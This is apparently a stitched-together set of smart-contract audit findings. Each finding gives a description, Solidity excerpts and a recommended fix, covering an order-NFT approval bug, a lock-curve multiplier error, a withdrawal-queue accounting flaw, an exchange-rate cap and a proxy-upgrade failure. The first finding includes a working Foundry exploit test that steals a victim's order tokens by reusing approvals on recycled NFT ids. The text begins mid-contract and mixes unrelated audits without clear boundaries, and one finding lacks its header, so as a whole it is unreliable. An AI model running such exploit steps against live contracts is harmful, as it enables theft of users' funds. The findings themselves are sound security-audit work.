        uint256 beforeOrderBookEthBalance;
    }
    MockQuoteToken quoteToken;
    MockBaseToken baseToken;
    MockOrderBook orderBook;
    OrderNFT orderToken;
    function setUp() public {
        quoteToken = new MockQuoteToken();
        baseToken = new MockBaseToken();
    }
    function cloberMarketSwapCallback(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOut,
        bytes calldata data
    ) external payable {
        if (data.length != 0) {
            Return memory expectedReturn = abi.decode(data, (Return));
            assertEq(tokenIn, expectedReturn.tokenIn, "ERROR_TOKEN_IN");
            assertEq(tokenOut, expectedReturn.tokenOut, "ERROR_TOKEN_OUT");
            assertEq(amountIn, expectedReturn.amountIn, "ERROR_AMOUNT_IN");
            assertEq(amountOut, expectedReturn.amountOut, "ERROR_AMOUNT_OUT");
            assertEq(msg.value, expectedReturn.refundBounty, "ERROR_REFUND_BOUNTY");
        }
        IERC20(tokenIn).transfer(msg.sender, amountIn);
    }
    function _createOrderBook(int24 makerFee, uint24 takerFee) private {
        orderToken = new OrderNFT();
        orderBook = new MockOrderBook(
            address(orderToken),
            address(quoteToken),
            address(baseToken),
            1,
            10**4,
            makerFee,
            takerFee,
            address(this)
        );
        orderToken.init("", "", address(orderBook), address(this));
        uint256 _quotePrecision = 10**quoteToken.decimals();
        quoteToken.mint(address(this), 1000000000 * _quotePrecision);
        quoteToken.approve(address(orderBook), type(uint256).max);
        uint256 _basePrecision = 10**baseToken.decimals();
        baseToken.mint(address(this), 1000000000 * _basePrecision);
        baseToken.approve(address(orderBook), type(uint256).max);
    }
    function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) {
        return (isBid ? 1 : 0) + (postOnly ? 2 : 0);
    }
    uint256 private constant _MAX_ORDER = 2**15; // 32768
    uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768
    function testExploit2() public {
        _createOrderBook(0, 0);
        address attacker = address(0x1337);
        address attacker2 = address(0x1338);
        address victim = address(0xbabe);
        // Step 1. Attacker creates an ASK limit order and receives NFT
        uint16 priceIndex = 100;
        uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
            user: attacker,
            priceIndex: priceIndex,
            rawAmount: 0,
            baseAmount: 1e18,
            options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
            data: new bytes(0)
        });
        // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds
        CloberOrderBook.OrderKey memory orderKey =
            CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex});
        uint256 currentTokenId = orderToken.encodeId(orderKey);
        orderKey.orderIndex += _MAX_ORDER;
        uint256 futureTokenId = orderToken.encodeId(orderKey);
        // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id
        vm.startPrank(attacker);
        orderToken.approve(attacker2, futureTokenId);
        CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1);
        orderKeys[0] = orderKey;
        orderKeys[0].orderIndex = orderIndex; // restore original orderIndex
        orderBook.cancel(attacker, orderKeys);
        vm.stopPrank();
        // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0
        uint256 victimOrderSize = 1e18;
        for(uint256 i = 0; i < _MAX_ORDER; i++) {
            orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
                user: i < _MAX_ORDER - 1 ? attacker : victim,
                priceIndex: priceIndex,
                rawAmount: 0,
                baseAmount: victimOrderSize,
                options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
                data: new bytes(0)
            });
        }
        assertEq(orderToken.ownerOf(futureTokenId), victim);
        // Step 5. Attacker steals the NFT and can cancel to receive the tokens
        vm.startPrank(attacker2);
        orderToken.transferFrom(victim, attacker, futureTokenId);
        vm.stopPrank();
        assertEq(orderToken.ownerOf(futureTokenId), attacker);
        uint256 baseBalanceBefore = baseToken.balanceOf(attacker);
        vm.startPrank(attacker);
        orderKeys[0].orderIndex = orderIndex + _MAX_ORDER;
        orderBook.cancel(attacker, orderKeys);
        vm.stopPrank();
        assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize);
    }
}
```

recommendation:
The approvals should be cleared on onMint, similar to onBurn. The owner must not control any future or past, already burned, tokens that map to the same index mod _MAX_ORDER. This must be fully prevented to mitigate this attack. Revert in getOrder if the orderKey maps to an NFT that has already been burned or not been minted yet. See Order owner isn't zeroed after burning's recommendation to correctly detect burned tokens.
```solidity
function onMint(
    address to,
    bool isBid,
    uint16 priceIndex,
    uint256 orderIndex
) external onlyOrderBook {
    require(to != address(0), Errors.EMPTY_INPUT);
    uint256 tokenId = _encodeId(isBid, priceIndex, orderIndex);
    // Clear approvals
    _approve(to, address(0), tokenId);
    _increaseBalance(to);
    emit Transfer(address(0), to, tokenId);
}
function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) {
    uint256 currentIndex = _getQueue(orderKey.isBid, orderKey.priceIndex).index;
    // valid active tokens are [currentIndex - _MAX_ORDER, currentIndex)
    require(orderKey.orderIndex < currentIndex, Errors.NFT_INVALID_ID);
    if (currentIndex >= _MAX_ORDER) {
        require(orderKey.orderIndex >= currentIndex - _MAX_ORDER, Errors.NFT_INVALID_ID);
    }
    return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M];
}
```

description:
TimeLockPool's setCurvePoint() can add or remove curve points, changing its length.  
It leaves unit variable that governs the duration to multiplier correspondence incorrect as it isn't updated.  
unit becomes incorrect after onlyGov setCurvePoint() updates the curve whenever its size changes.  
As setCurvePoint() is an independent operation, the unit will just stay incorrect after it. I.e. setCurve() and __TimeLockPool_init() that update the unit are alternatives to setCurvePoint(), there is no use cases when they run after setCurvePoint(), fixing the variable. So here it is one scenario, where setCurvePoint() is run and unit is incorrect after that.  
When unit is incorrect the getMultiplier() calculations become incorrect too.  
Suppose curve.length was 6, unit = maxLockDuration / (curve.length - 1) = maxLockDuration / 5, then setCurvePoint() shortened the curve, so curve.length becomes 3, but still unit = maxLockDuration / 5. Now getMultiplier(2 * maxLockDuration / 5) yields maximum shares multiplier as the very end of the curve will be used, while the lock is only 2/5 of the maxLockDuration.  
The impact is duration multiplier logic either removes the shares from users (when setCurvePoint() increased the length) or provides them with extra shares (when setCurvePoint() decreased the length), in violation of the desired logic. As the shares have monetary value and the precondition is just running a routine setup operation, setting the severity to be high.  
setCurvePoint() can change curve length, but leaves unit variable intact:  
ining/contracts/TimeLockPool.sol#L313-L337  
```solidity
/**
 * @notice Can set a point of the curve.
 * @dev This function can replace any point in the curve by inputing the existing index,
 * add a point to the curve by using the index that equals the amount of points of the curve,
 * and remove the last point of the curve if an index greater than the length is used. The first
 * point of the curve index is zero.
 * @param _newPoint uint256 point to be set.
 * @param _position uint256 position of the array to be set (zero-based indexing convention).
 */
function setCurvePoint(uint256 _newPoint, uint256 _position) external onlyGov {
    if (_newPoint > maxBonus) {
        revert MaxBonusError();
    }
    if (_position < curve.length) {
        curve[_position] = _newPoint;
    } else if (_position == curve.length) {
        curve.push(_newPoint);
    } else {
        if (curve.length - 1 < 2) {
            revert ShortCurveError();
        }
        curve.pop();
    }
    emit CurveChanged(_msgSender());
}
```
Currently unit is recalculated on initialization:  
ining/contracts/TimeLockPool.sol#L62  
```solidity
unit = _maxLockDuration / (curve.length - 1);
```
And on altering curve length with setCurve(), which rebuilds the entire curve:  
ining/contracts/TimeLockPool.sol#L284-L309  
```solidity
// same length curves
if (curve.length == _curve.length) {
    for (uint i=0; i < curve.length; i++) {
        curve[i] = maxBonusError(_curve[i]);
    }
// replacing with a shorter curve
} else if (curve.length > _curve.length) {
    for (uint i=0; i < _curve.length; i++) {
        curve[i] = maxBonusError(_curve[i]);
    }
    uint initialLength = curve.length;
    for (uint j=0; j < initialLength - _curve.length; j++) {
        curve.pop();
    }
    unit = maxLockDuration / (curve.length - 1);
// replacing with a longer curve
} else {
    for (uint i=0; i < curve.length; i++) {
        curve[i] = maxBonusError(_curve[i]);
    }
    uint initialLength = curve.length;
    for (uint j=0; j < _curve.length - initialLength; j++) {
        curve.push(maxBonusError(_curve[initialLength + j]));
    }
    unit = maxLockDuration / (curve.length - 1);
}
```
unit maps _lockDuration to the point on the curve, breaking this link if curve length had changed, while unit stayed the same:  
ining/contracts/TimeLockPool.sol#L233-L246  
```solidity
function getMultiplier(uint256 _lockDuration) public view returns(uint256) {
    // There is no need to check _lockDuration amount, it is always checked before
    // in the functions that call this function
    // n is the time unit where the lockDuration stands
    uint n = _lockDuration / unit;
    // if last point no need to interpolate
    // trim de curve if it exceedes the maxBonus // TODO check if this is needed
    if (n == curve.length - 1) {
        return 1e18 + curve[n];
    }
    // linear interpolation between points
    return 1e18 + curve[n] + (_lockDuration - n * unit) * (curve[n + 1] - curve[n]) / unit;
}
```

recommendation:
Consider recalculation unit on the spot each time:  
ining/contracts/TimeLockPool.sol#L313-L337  
```solidity
/**
 * @notice Can set a point of the curve.
 * @dev This function can replace any point in the curve by inputing the existing index,
 * add a point to the curve by using the index that equals the amount of points of the curve,
 * and remove the last point of the curve if an index greater than the length is used. The first
 * point of the curve index is zero.
 * @param _newPoint uint256 point to be set.
 * @param _position uint256 position of the array to be set (zero-based indexing convention).
 */
function setCurvePoint(uint256 _newPoint, uint256 _position) external onlyGov {
    if (_newPoint > maxBonus) {
        revert MaxBonusError();
    }
    if (_position < curve.length) {
        curve[_position] = _newPoint;
    } else if (_position == curve.length) {
        curve.push(_newPoint);
        unit = maxLockDuration / (curve.length - 1);
    } else {
        if (curve.length - 1 < 2) {
            revert ShortCurveError();
        }
        curve.pop();
        unit = maxLockDuration / (curve.length - 1);
    }
    emit CurveChanged(_msgSender());
}
```
setCurvePoint() is rare enough operation and cost of incorrect unit is rather big here, so the additional gas cost is justified.

description:
The `resetMiddle` function in the `AccountingManager` contract is designed to reset the middle index of either the deposit or withdraw queue. This function is crucial for managing the order and processing of transactions within these queues, particularly in scenarios where recalculations are necessary to ensure fairness and accuracy in the distribution of shares or handling of withdrawals.

The function will work as expected when resetting the deposit queue, but it will not work for the reset of the withdrawal queue and will cause wrong withdrawal amount accounting to occurs.

To understand the issue we must first see how the withdrawal queue middle is calculated. The middle index of the withdrawal queue is updated during the process of calculating the withdrawal shares. This occurs in the `calculateWithdrawShares` function, which is designed to process queued withdrawal requests and assign the corresponding amount of base tokens to each request based on the current share price.

For each withdrawal request in the queue that has not yet been processed, the function calculates the amount of base tokens equivalent to the shares requested for withdrawal. After processing the maximum allowed iterations or reaching the end of the queue, the function updates the official middle index of the withdrawal queue to the last processed index (middleTemp) and increments the total base token amount needed for the current withdraw group `currentWithdrawGroup.totalCBAmount` (remember this state as it will be important).

Here is the relevant part of the code that handles the updating of the middle index:

```solidity
function calculateWithdrawShares(uint256 maxIterations) public onlyManager nonReentrant whenNotPaused {
    uint256 middleTemp = withdrawQueue.middle;
    uint64 i = 0;

    ...

    while (withdrawQueue.last > middleTemp && i < maxIterations) {
        WithdrawRequest storage data = withdrawQueue.queue[middleTemp];
        uint256 assets = previewRedeem(data.shares);
        data.amount = assets;
        data.calculationTime = block.timestamp;
        emit CalculateWithdraw(middleTemp, data.owner, data.receiver, data.shares, assets, block.timestamp);
        middleTemp += 1;
        i += 1;
    }
    currentWithdrawGroup.totalCBAmount += assetsNeededForWithdraw;
    withdrawQueue.middle = middleTemp;
}
```

Now let’s see how the `resetMiddle` function will cause an issue to occur in the withdrawal process:

```solidity
function resetMiddle(
    uint256 newMiddle,
    bool depositOrWithdraw
) public onlyManager {
    if (depositOrWithdraw) {
        emit ResetMiddle(newMiddle, depositQueue.middle, depositOrWithdraw);

        if (
            newMiddle > depositQueue.middle ||
            newMiddle < depositQueue.first
        ) {
            revert NoyaAccounting_INVALID_AMOUNT();
        }
        depositQueue.middle = newMiddle;
    } else {
        emit ResetMiddle(
            newMiddle,
            withdrawQueue.middle,
            depositOrWithdraw
        );

        if (
            newMiddle > withdrawQueue.middle ||
            newMiddle < withdrawQueue.first ||
            currentWithdrawGroup.isStarted
        ) {
            revert NoyaAccounting_INVALID_AMOUNT();
        }
        withdrawQueue.middle = newMiddle;
        //@audit currentWithdrawGroup.totalCBAmount is not reset
    }
}
```

As it can be seen the function doesn’t reset the value for current withdraw group `currentWithdrawGroup.totalCBAmount` which will keep its value from the previous calculation which is supposed to be wrong, and thus when later on the manager will call `calculateWithdrawShares` to calculate the withdrawal shares once again, `currentWithdrawGroup.totalCBAmount` will get incremented on the previously calculated amount which will result in a bigger base token amount needed for the withdrawal to be processed than what was supposed to be.

Thus the accounting for the current withdrawal group will be wrong. This issue will cause the following problems:

* First it will force the protocol manager to withdraw more funds than intended from the connectors to reach the amount needed for withdrawal of current group represented by `currentWithdrawGroup.totalCBAmount` (which is wrong -bigger- in our case after the reset has occurred), this will result in potential yield that could’ve been generated and thus a loss for funds for the protocol and its users.
* The worst that can happen is if `currentWithdrawGroup.totalCBAmount` after being incremented twice for the same group (the first time and the second time after the reset call as it wasn’t updated) is bigger that the current protocol TVL (which can happen especially in early days of the vault), in that case the protocol is unable to get necessary amount of funds to execute the withdrawal and the withdrawal process and funds will remain blocked until new deposit are made & executed.

recommendation:
To address this issue, the `reset` function must reset the withdrawal amount requested `currentWithdrawGroup.totalCBAmount` (set back to 0), the function should be modified as follows:

```solidity
function resetMiddle(
    uint256 newMiddle,
    bool depositOrWithdraw
) public onlyManager {
    if (depositOrWithdraw) {
        emit ResetMiddle(newMiddle, depositQueue.middle, depositOrWithdraw);

        if (
            newMiddle > depositQueue.middle ||
            newMiddle < depositQueue.first
        ) {
            revert NoyaAccounting_INVALID_AMOUNT();
        }
        depositQueue.middle = newMiddle;
    } else {
        emit ResetMiddle(
            newMiddle,
            withdrawQueue.middle,
            depositOrWithdraw
        );

        if (
            newMiddle > withdrawQueue.middle ||
            newMiddle < withdrawQueue.first ||
            currentWithdrawGroup.isStarted
        ) {
            revert NoyaAccounting_INVALID_AMOUNT();
        }
        withdrawQueue.middle = newMiddle;
        currentWithdrawGroup.totalCBAmount = 0;
    }
}
```

Fixed in commit 962d297e937e82d95e20739078a61b00eea47643.  
If we are resetting the withdrawal queue, we have to reset all withdrawals that are calculated so far. So we can safely set the `totalCBAmount` to 0.

Remove the lines of code that limit the `_withdrawableAssets`:
```solidity
if (_withdrawableAssets > _totalSupplyToAssets) {
  _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);
}
```

**Proof of Concept:**
```solidity
function _currentExchangeRate() internal view returns (uint256) {
    uint256 _totalSupplyAmount = _totalSupply();
    uint256 _totalSupplyToAssets = _convertToAssets(
      _totalSupplyAmount,
      _lastRecordedExchangeRate,
      Math.Rounding.Down
    );

    uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this));

    if (_withdrawableAssets > _totalSupplyToAssets) {
      _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);
    }

    if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {
      return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);
    }

    return _assetUnit;
  }
```
The `_totalSupplyAmount != 0 && _withdrawableAssets != 0`, `_currentExchangeRate` function will return a value `_withdrawableAssets * _assetUnit / _totalSupplyAmount`. However, `_withdrawableAssets` can not exceed `_totalSupplyToAssets`, which is equal to `_totalSupplyAmount * _lastRecordedExchangeRate / _assetUnit`. Therefore, `_currentExchangeRate` will always be lower than or equal to `_lastRecordedExchangeRate`.

Add this assert line and run `forge test`; all tests will pass.
```solidity
if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {
  assert(_withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down) <= _assetUnit);
  return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);
}
```

description:
MembershipERC1155 proxy cannot be upgraded due to incorrect execution flow.

When a DAO membership is created by MembershipFactory, it is deployed as a MembershipERC1155 proxy, and proxyAdmin is used.

MembershipFactory.sol#L72-L76:

```solidity
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            membershipImplementation,
            address(proxyAdmin),
            abi.encodeWithSignature("initialize(string,string,string,address,address)", daoConfig.ensname, "OWP", baseURI, _msgSender(), daoConfig.currency)
        );
```

The deployed MembershipERC1155 proxy is expected to be upgraded by proxyAdmin by calling upgradeAndCall().

ProxyAdmin.sol#L38-L44:

```solidity
    function upgradeAndCall(
        ITransparentUpgradeableProxy proxy,
        address implementation,
        bytes memory data
    ) public payable virtual onlyOwner {
        proxy.upgradeToAndCall{value: msg.value}(implementation, data);
    }
```

The expected upgrade flow would be like:

upgradeAndCall()                            upgradeToAndCall()
admin --------------------> proxyAdmin --------------------> proxy

Unfortunately, this simply won't work.&#x20;

When a TransparentUpgradeableProxy instance is called, the call will be forwarded to _fallback() function, and only if the caller is the admin of the proxy, the proxy is upgraded.

TransparentUpgradeableProxy.sol#L95-L105:

```solidity
    function _fallback() internal virtual override {
        if (msg.sender == _proxyAdmin()) {
            if (msg.sig != ITransparentUpgradeableProxy.upgradeToAndCall.selector) {
                revert ProxyDeniedAdminAccess();
            } else {
                _dispatchUpgradeToAndCall();
            }
        } else {
            super._fallback();
        }
    }
```

TransparentUpgradeableProxy.sol#L88-L90:

```solidity
    function _proxyAdmin() internal view virtual returns (address) {
        return _admin;
    }
```

The problem is proxyAdmin is not the admin of the MembershipERC1155 proxy, as can be seen in the constructor of TransparentUpgradeableProxy, when a proxy instance is deployed, it creates an an associated ProxyAdmin instance (let's call it proxyAdmin2) to manage the proxy, so the admin of the MembershipERC1155 proxy is proxyAdmin2 instead of proxyAdmin.

TransparentUpgradeableProxy.sol#L79-L83:

```solidity
    constructor(address logic, address initialOwner, bytes memory data) payable ERC1967Proxy(logic, data) {
        _admin = address(new ProxyAdmin(initialOwner));
        // Set the storage value and emit an event for ERC-1967 compatibility
        ERC1967Utils.changeAdmin(_proxyAdmin());
    }
```

As a result, any call to upgrade a MembershipERC1155 proxy will not be process internally but forwarded to the implementation, and the call will revert.

Therefore, to make MembershipERC1155 proxy  actually be upgraded, the flow should be like:

upgradeAndCall()                             upgradeAndCall()                                upgradeToAndCall()
admin --------------------> proxyAdmin --------------------> proxyAdmin2 --------------------> proxy

However, we cannot make proxyAdmin call upgradeAndCall() in proxyAdmin2, nor can we  transfer proxyAdmin2 ownership to admin.

Please follow the steps to run PoC to verify:
Follow the instructions to add foundry to the project (You may need to change hardhat version to 2.17.2 in package.json);
Create a test file (.t.sol) containing below in /test directory;
Run forge test --mt testAudit_upgradeProxy.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/dao/MembershipFactory.sol";
import "../contracts/dao/CurrencyManager.sol";
import "../contracts/dao/tokens/MembershipERC1155.sol";
import {DAOType, DAOConfig, DAOInputConfig, TierConfig} from "../contracts/dao/libraries/MembershipDAOStructs.sol";

contract Audit is Test {
    address admin = makeAddr("Admin");
    address owpWallet = makeAddr("owpWallet");

    ERC20 WETH = new MockERC20("Wrapped ETH", "WETH", 18);
    ERC20 WBTC = new MockERC20("Wrapped BTC", "WBTC", 8);
    ERC20 USDC = new MockERC20("USDC", "USDC", 6);

    MembershipFactory membershipFactory;
    CurrencyManager currencyManager;

    function setUp() public {
        vm.startPrank(admin);

        // Deploy CurrencyManager
        currencyManager = new CurrencyManager();
        currencyManager.addCurrency(address(WETH));
        currencyManager.addCurrency(address(WBTC));
        currencyManager.addCurrency(address(USDC));

        // Deploy MembershipERC1155
        MembershipERC1155 membershipERC1155Implementation = new MembershipERC1155();

        // Deploy MembershipFactory
        membershipFactory = new MembershipFactory(
            address(currencyManager), 
            owpWallet, 
            "https://baseuri.com/", 
            address(membershipERC1155Implementation)
        );

        vm.stopPrank();
    }

    function testAudit_upgradeProxy() public {
        // Create DAO
        address creator = makeAddr("Creator");
        DAOInputConfig memory daoInputConfig = DAOInputConfig({
            ensname: "SPONSORED DAO",
            daoType: DAOType.SPONSORED,
            currency: address(USDC),
            maxMembers: 127,
            noOfTiers: 7
        });

        vm.startPrank(creator);
        address daoMemebershipProxy = membershipFactory.createNewDAOMembership(
            daoInputConfig, 
            createTierConfigs(
                daoInputConfig.noOfTiers, 
                ERC20(daoInputConfig.currency).decimals()
            )
        );
        vm.stopPrank();

        // Deploy new MembershipERC1155 implementation
        MembershipERC1155v2 membershipERC1155v2Implementation = new MembershipERC1155v2();

        vm.startPrank(admin);
        membershipFactory.updateMembershipImplementation(address(membershipERC1155v2Implementation));
        ProxyAdmin proxyAdmin = membershipFactory.proxyAdmin();
        // Upgrade MembershipERC1155 will revert
        vm.expectRevert();
        proxyAdmin.upgradeAndCall(ITransparentUpgradeableProxy(daoMemebershipProxy), address(membershipERC1155v2Implementation), "");
        vm.stopPrank();
    }

    function createTierConfigs(uint noOfTiers, uint8 decimals) private returns (TierConfig[] memory tiers) {
        tiers = new TierConfig[](noOfTiers);

        uint price = 1 * 10 ** decimals;
        uint power = 1;
        for (int i = int(noOfTiers) - 1; i >= 0; --i) {
            uint index = uint(i);
            tiers[index] = TierConfig({
                amount: 2 ** index,
                price: price,
                power: power,
                minted: 0
            });

            price *= 2;
            power *= 2;
        }
    }
}

contract MockERC20 is ERC20 {
    uint8 _decimals;

    constructor(
        string memory name_, 
        string memory symbol_, 
        uint8 decimals_
    ) ERC20(name_, symbol_) {
        _decimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }
}

contract MembershipERC1155v2 is MembershipERC1155 {}
```

MembershipERC1155 proxy cannot be upgraded.

recommendation:
There are 2 mitigations:
The simplest solution is to declare proxyAdmin as an address (EOA/Multisig) instead of an ProxyAdmin instance, then it can call proxyAdmin2 (the address can be accessed by reading  the proxy's ERC-1967 admin slot) to upgrade MembershipERC1155proxy.
Or we can override TransparentUpgradeableProxy's _proxyAdmin() in a child contract, and use the child contract to create DAO membership proxy.

```solidity
contract MembershipERC1155Proxy is TransparentUpgradeableProxy {
    constructor(
        address _logic, 
        address initialOwner, 
        bytes memory _data
    ) TransparentUpgradeableProxy(_logic, initialOwner, _data) {}

    function _proxyAdmin() internal view override returns (address) {
        return ProxyAdmin(super._proxyAdmin()).owner();
    }
}
```

MembershipFactory.sol#L72-L76:

